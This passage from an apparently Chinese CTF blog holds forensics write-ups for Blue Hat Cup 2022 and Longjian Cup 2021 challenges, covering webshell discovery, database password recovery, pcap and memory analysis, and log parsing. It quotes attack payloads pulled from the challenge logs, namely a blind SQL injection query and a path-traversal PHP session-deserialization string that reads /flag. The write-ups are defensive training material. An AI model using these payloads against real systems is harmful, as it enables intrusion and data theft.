class="language-none">SangFor&#123;S0_3azy_2_crack_noob_player&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="è“å¸½æ¯-2022-åˆèµ›-ç½‘ç«™å–è¯"><a href="#è“å¸½æ¯-2022-åˆèµ›-ç½‘ç«™å–è¯" class="headerlink" title="[è“å¸½æ¯ 2022 åˆèµ›]ç½‘ç«™å–è¯"></a>[è“å¸½æ¯ 2022 åˆèµ›]ç½‘ç«™å–è¯</h1><pre class="line-numbers language-none"><code class="language-none">æ®äº†è§£ï¼ŒæŸç½‘ä¸Šå•†åŸç³»ä¸€å›¢ä¼™æ—¥å¸¸èµ„é‡‘å¾€æ¥ç”¨ï¼Œä»2022å¹´4æœˆ1æ—¥èµ·ä½¿ç”¨è™šæ‹Ÿå¸GGå¸è¿›è¡Œäº¤æ˜“ï¼Œç°å·²è·å¾—è¯¥ç½‘ç«™çš„æºä»£ç ä»¥åŠéƒ¨åˆ†æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®1"><a href="#é—®1" class="headerlink" title="é—®1"></a>é—®1</h2><pre class="line-numbers language-none"><code class="language-none">è¯·ä»ç½‘ç«™æºç ä¸­æ‰¾å‡ºæœ¨é©¬æ–‡ä»¶ï¼Œå¹¶æäº¤æœ¨é©¬è¿æ¥çš„å¯†ç ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œæ˜¯ç½‘ç«™çš„æ ¹ç›®å½•å¤‡ä»½å‹ç¼©åŒ…å’Œsqlå¤‡ä»½æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬ç›´æ¥è§£å‹å‹ç¼©åŒ…ï¼Œè¢«ç«ç»’æŸ¥æ€å‡ºä¸€ä¸ªwebshell</p><p><img src="https://imag.keyblue.cn/imag/202308301443483.png" alt="image-20230830144300440"></p><p>é‚£ä¹ˆé¢˜ç›®éœ€è¦çš„æœ¨é©¬æ–‡ä»¶åº”è¯¥å°±æ˜¯å®ƒäº†</p><p>æˆ‘ä»¬æ‰“å¼€è¯¥æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308301445852.png" alt="image-20230830144554819"></p><p>è¿æ¥å¯†ç æ˜¯</p><pre class="line-numbers language-none"><code class="language-none">lanmaobei666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®2"><a href="#é—®2" class="headerlink" title="é—®2"></a>é—®2</h2><pre class="line-numbers language-none"><code class="language-none">è¯·æäº¤æ•°æ®åº“è¿æ¥çš„æ˜æ–‡å¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡Seqyæºç å®¡è®¡ç³»ç»Ÿå…¨å±€æœç´¢password</p><p><img src="https://imag.keyblue.cn/imag/202308301503765.png" alt="image-20230830150325734"></p><p>ç‚¹å¼€ç¬¬ä¸€ä¸ªdatabase.0.php,å‘ç°æ•°æ®åº“ç”¨æˆ·åæ˜æ–‡æ˜¾ç¤ºåœ¨æ­¤æ–‡ä»¶å†…ï¼ŒåŒæ—¶çœ‹åˆ°å¯†ç æ˜¯ç”±my_encrypt()å‡½æ•°å†³å®šçš„</p><p><img src="https://imag.keyblue.cn/imag/202308301504821.png" alt="image-20230830150448782"></p><p>è¿½è¸ªåˆ°my_encrypt()å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308301507686.png" alt="image-20230830150735660"></p><p>æˆ‘ä»¬æ­å»ºä¸€ä¸ªphpç¯å¢ƒè¿è¡Œä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼ŒåŒæ—¶è¾“å‡ºå¯†ç </p><p><img src="https://imag.keyblue.cn/imag/202308301541360.png" alt="image-20230830154140311"></p><p><img src="https://imag.keyblue.cn/imag/202308301541375.png" alt="image-20230830154159345"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯phpç¯å¢ƒç‰ˆæœ¬ä¸èƒ½é«˜äº7.1ã€‚å› ä¸ºä»£ç ä¸­ä½¿ç”¨çš„mcrypt_module_open()å‡½æ•°åœ¨7.2ç‰ˆæœ¬è¢«å¼ƒç”¨äº†</p><p>æ˜æ–‡å¯†ç ä¸º</p><pre class="line-numbers language-none"><code class="language-none">KBLT123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®3"><a href="#é—®3" class="headerlink" title="é—®3"></a>é—®3</h2><pre class="line-numbers language-none"><code class="language-none">è¯·æäº¤æ•°æ®åº“é‡‘é¢åŠ å¯†æ··æ·†ä½¿ç”¨çš„ç›å€¼ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¨å±€æœç´¢key</p><p><img src="https://imag.keyblue.cn/imag/202308301548623.png" alt="image-20230830154830593"></p><p>ç¬¬ä¸€é¡¹å†…å®¹ä¼¼ä¹å°±æ˜¯é—®é¢˜æåˆ°çš„ç›å€¼</p><p><img src="https://imag.keyblue.cn/imag/202308301549256.png" alt="image-20230830154947229"></p><p><em>é¢˜ä¸»ä¼¼ä¹åœ¨è¯´åŠ ç›æœ€ç‹—</em>ğŸ¤£</p><p>ç›å€¼ä¸º</p><pre class="line-numbers language-none"><code class="language-none">jyzg123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®4"><a href="#é—®4" class="headerlink" title="é—®4"></a>é—®4</h2><pre class="line-numbers language-none"><code class="language-none">è¯·è®¡ç®—å¼ å®åœ¨åŒ—äº¬æ—¶é—´2022-04-02 00:00:00-2022-04-18 23:59:59ç´¯è®¡è½¬è´¦ç»™ç‹å­è±ªå¤šå°‘RMBï¼Ÿï¼ˆæ¢ç®—æ¯”ä¾‹è¯·ä»æ•°æ®åº“ä¸­è·å–ï¼Œç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼š123.45ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ”¾ç€åˆ«åšäº†ğŸ˜‚æµªè´¹æ—¶é—´</p><h1 id="è“å¸½æ¯-2022-åˆèµ›-è®¡ç®—æœºå–è¯"><a href="#è“å¸½æ¯-2022-åˆèµ›-è®¡ç®—æœºå–è¯" class="headerlink" title="[è“å¸½æ¯ 2022 åˆèµ›]è®¡ç®—æœºå–è¯"></a>[è“å¸½æ¯ 2022 åˆèµ›]è®¡ç®—æœºå–è¯</h1><pre class="line-numbers language-none"><code class="language-none">ç°å¯¹ä¸€ä¸ªwindowsè®¡ç®—æœºè¿›è¡Œå–è¯ï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®1-1"><a href="#é—®1-1" class="headerlink" title="é—®1"></a>é—®1</h2><pre class="line-numbers language-none"><code class="language-none">ä»å†…å­˜é•œåƒä¸­è·å¾—taqi7çš„å¼€æœºå¯†ç æ˜¯å¤šå°‘ï¼Ÿ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309011513162.png" alt="image-20230901151036671"></p><p>å¯†æ–‡ï¼š<code>7f21caca5685f10d9e849cc84c340528</code></p><pre class="line-numbers language-none"><code class="language-none">anxinqi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®2-1"><a href="#é—®2-1" class="headerlink" title="é—®2"></a>é—®2</h2><pre class="line-numbers language-none"><code class="language-none">åˆ¶ä½œè¯¥å†…å­˜é•œåƒçš„è¿›ç¨‹Pidå·æ˜¯å¤šå°‘ï¼Ÿ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MagnetRAMCaptuæ˜¯åˆ¶ä½œé•œåƒåˆ¶ä½œå·¥å…·</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp --profile&#x3D;Win7SP1x64 pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309021419123.png" alt="image-20230902141951071"></p><p>æ‰€ä»¥è¿›ç¨‹å·æ˜¯2192</p><pre class="line-numbers language-none"><code class="language-none">2192<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®3-1"><a href="#é—®3-1" class="headerlink" title="é—®3"></a>é—®3</h2><pre class="line-numbers language-none"><code class="language-none">bitlokceråˆ†åŒºæŸofficeæ–‡ä»¶ä¸­å­˜åœ¨çš„flagå€¼ä¸ºï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šNSSCTF&#123;abcABC123&#125;ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Bitlockeræ˜¯windowsç³»ç»Ÿçš„åŠ å¯†åˆ†åŒº</p><h1 id="é™‡å‰‘æ¯-2021-ios"><a href="#é™‡å‰‘æ¯-2021-ios" class="headerlink" title="[é™‡å‰‘æ¯ 2021]ios"></a>[é™‡å‰‘æ¯ 2021]ios</h1><pre class="line-numbers language-none"><code class="language-none">ä¸€ä½iosçš„å®‰å…¨ç ”ç©¶å‘˜åœ¨å®¶ä¸­ä½¿ç”¨æ‰‹æœºè”ç½‘è¢«é»‘ï¼Œä¸ä»…è¢«çªƒå¯†è¿˜ä¸¢å¤±æ¯”ç‰¹å¸è‹¥å¹²ï¼Œè¯·ä½ é€šè¿‡æµé‡å’Œæ—¥å¿—åˆ†æåä½œç­”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®1-2"><a href="#é—®1-2" class="headerlink" title="é—®1"></a>é—®1</h2><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢æ‰€æ§åˆ¶çš„C&amp;CæœåŠ¡å™¨IPæ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å¼€å‹ç¼©åŒ…æ˜¯ä¸‰ä¸ªæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308311527682.png" alt="image-20230831152757660"></p><p>æ‰“å¼€wiresharkï¼Œåœ¨ç¬¬ 15 TCPæµæœ‰é‡è¦æ˜æ–‡ä¿¡æ¯</p><p><img src="https://imag.keyblue.cn/imag/202308311549622.png" alt="image-20230831154955567"></p><p>å¯ä»¥çœ‹åˆ°IPæš´éœ²</p><pre class="line-numbers language-none"><code class="language-none">3.128.156.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®2-2"><a href="#é—®2-2" class="headerlink" title="é—®2"></a>é—®2</h2><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢åˆ©ç”¨çš„Githubå¼€æºé¡¹ç›®çš„åå­—æ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚å›¾ï¼Œgithubé“¾æ¥</p><p><img src="https://imag.keyblue.cn/imag/202308311553117.png" alt="image-20230831155305065"></p><pre class="line-numbers language-none"><code class="language-none">stowaway<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®3-2"><a href="#é—®3-2" class="headerlink" title="é—®3"></a>é—®3</h2><pre class="line-numbers language-none"><code class="language-none">é€šè®¯åŠ å¯†å¯†é’¥çš„æ˜æ–‡æ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚å›¾</p><p><img src="https://imag.keyblue.cn/imag/202308311556187.png" alt="image-20230831155633134"></p><pre class="line-numbers language-none"><code class="language-none">hack4sec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®4-1"><a href="#é—®4-1" class="headerlink" title="é—®4"></a>é—®4</h2><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢é€šè¿‡SQLç›²æ³¨æ‹¿åˆ°äº†ä¸€ä¸ªæ•æ„Ÿæ•°æ®ï¼Œå†…å®¹æ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸€é—®è€ƒå¯Ÿçš„æ˜¯tlsæµé‡çš„è§£å¯†ï¼Œéœ€è¦ç”¨åˆ°é¢˜ç›®æä¾›çš„<code>keylog.txt</code></p><p>é¦–å…ˆæ‰“å¼€é¦–é€‰é¡¹</p><p><img src="https://imag.keyblue.cn/imag/202308311602210.png" alt="image-20230831160231166"></p><p>ç‚¹å¼€Protocolsï¼Œæ‰¾åˆ°TLS</p><p><img src="https://imag.keyblue.cn/imag/202308311604558.png" alt="image-20230831160450529"></p><p>é€‰æ‹©keylog.txtç„¶åç¡®å®šå³å¯</p><p><img src="https://imag.keyblue.cn/imag/202308311605730.png" alt="image-20230831160517709"></p><p>ç­›é€‰HTTP2</p><p><img src="https://imag.keyblue.cn/imag/202308311606961.png" alt="image-20230831160659905"></p><p>æŸ¥æ‰¾selectå­—ç¬¦ä¸²</p><p><img src="https://imag.keyblue.cn/imag/202308311923959.png" alt="image-20230831192314908"></p><p>å¯¹å…¶ä¸­ä¸€æ¡è¿›è¡ŒURLè§£ç </p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;info?l&#x3D;1&amp;o&#x3D;(case_when_(select_hex(substr(password,1,1))_from_user)&#x3D;&quot;2D&quot;_then_id_else_col1_end)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€‰ä¸­å¼€å§‹ç›²æ³¨åˆ°ç›²æ³¨ç»“æŸçš„åŒ…</p><p><img src="https://imag.keyblue.cn/imag/202308311931734.png" alt="image-20230831193146679"></p><p>é€‰æ‹©å¯¼å‡ºä¸ºçº¯æ–‡æœ¬</p><p><img src="https://imag.keyblue.cn/imag/202308311932924.png" alt="image-20230831193209892"></p><p>é€‰æ‹©æŸ¥è¯¢çš„åŒ…å’Œå–æ¶ˆå‹¾é€‰packet details</p><p><img src="https://imag.keyblue.cn/imag/202308311933572.png" alt="image-20230831193342543"></p><p>å¯¼å‡ºå</p><p><img src="https://imag.keyblue.cn/imag/202308311934755.png" alt="image-20230831193427695"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> reflag <span class="token operator">=</span> <span class="token string">''</span>num_old <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/triffi.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(application/json)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'o=%28case_when_%28select_hex%28substr%28password'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"%2C(.*?)%2C1%29%29"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> num <span class="token operator">></span> num_old<span class="token punctuation">:</span>                num_old <span class="token operator">=</span> num                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            var <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"user%29%3D%22(.*?)%22"</span></span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202308311955152.png" alt="image-20230831195536119"></p><p>å¾—åˆ°æ•æ„Ÿæ•°æ®</p><pre class="line-numbers language-none"><code class="language-none">746558f3-c841-456b-85d7-d6c0f2edabb2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®5"><a href="#é—®5" class="headerlink" title="é—®5"></a>é—®5</h2><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢ç«¯å£æ‰«æçš„æ‰«æå™¨çš„æ‰«æèŒƒå›´æ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€‰æ‹©åˆ†æ-ä¸“å®¶ä¿¡æ¯</p><p><img src="https://imag.keyblue.cn/imag/202309010944060.png" alt="image-20230901094440035"></p><p>å–æ¶ˆå‹¾é€‰è¿‡æ»¤å™¨çš„é™åˆ¶</p><p><img src="https://imag.keyblue.cn/imag/202309010945115.png" alt="image-20230901094518082"></p><p>æ‰“å¼€RST</p><p><img src="https://imag.keyblue.cn/imag/202309010945028.png" alt="image-20230901094547982"></p><p>å¦‚å›¾ï¼Œä»10å¼€å§‹</p><p><img src="https://imag.keyblue.cn/imag/202309010946551.png" alt="image-20230901094634504"></p><p>æ‰«åˆ°499å·ç«¯å£ç»“æŸ</p><p><img src="https://imag.keyblue.cn/imag/202309010947537.png" alt="image-20230901094721486"></p><p>æ­¤å¤–ï¼Œæ‰“å¼€ç»Ÿè®¡-ä¼šè¯</p><p><img src="https://imag.keyblue.cn/imag/202309011038297.png" alt="image-20230901103807273"></p><p>é€‰æ‹©TCPï¼Œå¹¶å¯¹ç«¯å£è¿›è¡Œæ’åºï¼Œå¯ä»¥çœ‹åˆ°ç«¯å£çš„è§„å¾‹</p><p><img src="https://imag.keyblue.cn/imag/202309011038141.png" alt="image-20230901103851115"></p><p>è¿™æ ·ä¹Ÿå¯ä»¥å¾—åˆ°æ‰«æçš„ç«¯å£</p><pre class="line-numbers language-none"><code class="language-none">10-499<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®6"><a href="#é—®6" class="headerlink" title="é—®6"></a>é—®6</h2><pre class="line-numbers language-none"><code class="language-none">è¢«å®³è€…æ‰‹æœºä¸Šè¢«æ‹¿èµ°äº†çš„ç§é’¥æ–‡ä»¶å†…å®¹æ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®7"><a href="#é—®7" class="headerlink" title="é—®7"></a>é—®7</h2><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢è®¿é—®&#x2F;æ”»å‡»äº†å†…ç½‘çš„å‡ ä¸ªæœåŠ¡å™¨ï¼ŒIPåœ°å€ä¸º<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šé¢é»‘å®¢å¯¹192.168.1.12è¿›è¡Œäº†sqlç›²æ³¨</p><p>å¦å¤–ï¼Œæ ¹æ®access.logæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309011023611.png" alt="image-20230901102302571"></p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“172.28.0.3ä¹Ÿæ˜¯å—å®³è€…ä¹‹ä¸€</p><pre class="line-numbers language-none"><code class="language-none">172.28.0.3#192.168.1.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="é—®8"><a href="#é—®8" class="headerlink" title="é—®8"></a>é—®8</h2><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢å†™å…¥äº†ä¸€ä¸ªwebshellï¼Œå…¶å¯†ç ä¸º<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬è§‚å¯Ÿlogæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309011030427.png" alt="image-20230901103009402"></p><p>å‘ç°é»‘å®¢åœ¨æ‰§è¡Œwhoami</p><p>æ‰€ä»¥å¯†ç ä¸º</p><pre class="line-numbers language-none"><code class="language-none">fxxk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="é™‡å‰‘æ¯-2021-SQLæ³¨å…¥"><a href="#é™‡å‰‘æ¯-2021-SQLæ³¨å…¥" class="headerlink" title="[é™‡å‰‘æ¯ 2021]SQLæ³¨å…¥"></a>[é™‡å‰‘æ¯ 2021]SQLæ³¨å…¥</h1><h2 id="é—®1-3"><a href="#é—®1-3" class="headerlink" title="é—®1"></a>é—®1</h2><p>æ˜æ˜¾çš„å¸ƒå°”ç›²æ³¨</p><h2 id="é—®2-3"><a href="#é—®2-3" class="headerlink" title="é—®2"></a>é—®2</h2><p>æ‹‰åˆ°æ—¥å¿—æœ€å</p><p><img src="https://imag.keyblue.cn/imag/202308271453488.png" alt="image-20230827145327453"></p><p>çœ‹åˆ°å­—æ®µä¸ºflagï¼Œæ•°æ®åº“ä¸ºsqliï¼Œè¡¨ä¸ºflag</p><h2 id="é—®3-3"><a href="#é—®3-3" class="headerlink" title="é—®3"></a>é—®3</h2><p>è§‚å¯Ÿå‘ç°åŒ¹é…åˆ°æ­£ç¡®çš„å­—ç¬¦æ—¶ï¼Œå“åº”çš„é¡µé¢å­—ç¬¦å¤§å°ä¸º<code>479|480|481|482</code>æ ¹æ®è¿™ä¸ªç‰¹å¾æœ‰æ­¤è„šæœ¬</p><pre class="line-numbers language-none"><code class="language-none">import reflag &#x3D; &#39;&#39;with open(&#39;res&#x2F;access.log&#39;, &#39;r&#39;) as f:    for line in f:        if re.search(&#39;(select%20flag%20from%20sqli.flag)&#39;, line):            if re.search(&#39;479|480|481|482&#39;, line):                line &#x3D; re.findall(&quot;%20&#x3D;%20&#39;(.+)&#39;,1,&quot;, line)[0]                flag +&#x3D; line                print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åå¾—åˆ°flagå€¼<code>flag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;</code></p><h1 id="é™‡å‰‘æ¯-2021-å†…å­˜åˆ†æ"><a href="#é™‡å‰‘æ¯-2021-å†…å­˜åˆ†æ" class="headerlink" title="[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æ"></a>[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æ</h1><h2 id="é—®1-4"><a href="#é—®1-4" class="headerlink" title="é—®1"></a>é—®1</h2><p>è§£å¼€å‹ç¼©åŒ…å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308291018351.png" alt="image-20230829101826317"></p><p>å…ˆçœ‹txtæ–‡æœ¬</p><p><img src="https://imag.keyblue.cn/imag/202308291018667.png" alt="image-20230829101857649"></p><p>ä½¿ç”¨volatilityå¯¹æ–‡ä»¶è¿›è¡Œåˆ†æ</p><p>é¦–å…ˆæŸ¥çœ‹é•œåƒä¿¡æ¯</p><p><img src="https://imag.keyblue.cn/imag/202308291034248.png" alt="image-20230829103417211"></p><p>é¢˜ç›®æ˜¯éœ€è¦çŸ¥é“è™šæ‹Ÿæœºçš„å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨mimikatzæŸ¥çœ‹æˆ–è€…lsadump</p><p><img src="https://imag.keyblue.cn/imag/202308291038639.png" alt="image-20230829103822601"></p><p>flagå€¼ï¼šflag{W31C0M3 T0 THiS 34SY F0R3NSiCX}</p><h2 id="é—®2-4"><a href="#é—®2-4" class="headerlink" title="é—®2"></a>é—®2</h2><p>å…ˆæ‰¾æ‰¾å…³é”®å­—ctfæˆ–è€…flagä»€ä¹ˆçš„ï¼Œå‘ç°æœ‰HUAWEI</p><p><img src="https://imag.keyblue.cn/imag/202308291057514.png" alt="image-20230829105701484"></p><p>æ ¹æ®é¢˜æ„ï¼Œflagåœ¨æŸå“ç‰Œæ‰‹æœºçš„å¤‡ä»½æ–‡ä»¶é‡Œé¢ï¼Œéšæœºç­›é€‰HUAWEIå…³é”®è¯</p><p><img src="https://imag.keyblue.cn/imag/202308291057863.png" alt="image-20230829105749832"></p><p>å°†æ–‡ä»¶éƒ½ä¸‹è½½ä¸‹æ¥</p><p><img src="https://imag.keyblue.cn/imag/202308291103074.png" alt="image-20230829110349048"></p><p>ä¸‹è½½åä¸ºå¤‡ä»½è§£å¯†å·¥å…·ï¼Œ</p><p>å·¥å…·åœ°å€ï¼š<a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p><p>ä½¿ç”¨å‘½ä»¤è§£å¯† è§£å¯†éœ€è¦å¯†ç ï¼Œå¯†ç æ ¹æ®æç¤ºæ˜¯ä¸Šä¸€é—®çš„flagå€¼</p><pre class="line-numbers language-none"><code class="language-none">python .\kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &#39;C:\Users\dell\Downloads\Compressed\kobackupdec-master\HUAWEI P40_2021-aa-bb xx.yy.zz&#39; C:\Users\dell\Downloads\Compressed\kobackupdec-master\buk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å¼€è§£å¯†åçš„æ–‡ä»¶å¤¹ï¼Œå‘ç°ä¸€ä¸ªå‹ç¼©åŒ…</p><p><img src="https://imag.keyblue.cn/imag/202308291220132.png" alt="image-20230829122055096"></p><p>ä½¿ç”¨7zæ‰“å¼€</p><p><img src="https://imag.keyblue.cn/imag/202308291221941.png" alt="image-20230829122133917"></p><p>å‘ç°flagå€¼flag{TH4NK Y0U FOR DECRYPTING MY DATA}</p><h1 id="é™‡å‰‘æ¯-2021-æ—¥å¿—åˆ†æ"><a href="#é™‡å‰‘æ¯-2021-æ—¥å¿—åˆ†æ" class="headerlink" title="[é™‡å‰‘æ¯ 2021]æ—¥å¿—åˆ†æ"></a>[é™‡å‰‘æ¯ 2021]æ—¥å¿—åˆ†æ</h1><h2 id="é—®1-5"><a href="#é—®1-5" class="headerlink" title="é—®1"></a>é—®1</h2><p>æ ¹æ®æ—¥å¿—æ–‡ä»¶å‘ç°å“åº”ç 200æå°‘ï¼Œéšæœºç­›é€‰å«200çš„è¡Œã€‚</p><p>å‘ç°äº†æ³„éœ²çš„<a href="http://www.zipæ–‡ä»¶/">www.zipæ–‡ä»¶</a></p><p><img src="https://imag.keyblue.cn/imag/202308271557455.png" alt="image-20230827155715439"></p><h2 id="é—®2-5"><a href="#é—®2-5" class="headerlink" title="é—®2"></a>é—®2</h2><p>æŸ¥çœ‹æ—¥å¿—ï¼Œåœ¨æœ€åå‘ç°äº†&#x2F;?filename&#x3D;çš„è¯­å¥ï¼Œ</p><pre class="line-numbers language-none"><code class="language-none">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content&#x3D;func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7Dè§£ç å¾—åˆ°..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_car&amp;content&#x3D;func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;.&#x2F;files&#x2F;filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;.&#x2F;files&#x2F;call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æ–‡ä»¶åä¸ºsess_car</p><h2 id="é—®3-4"><a href="#é—®3-4" class="headerlink" title="é—®3"></a>é—®3</h2><pre class="line-numbers language-none"><code class="language-none">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content&#x3D;func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7Dè§£ç 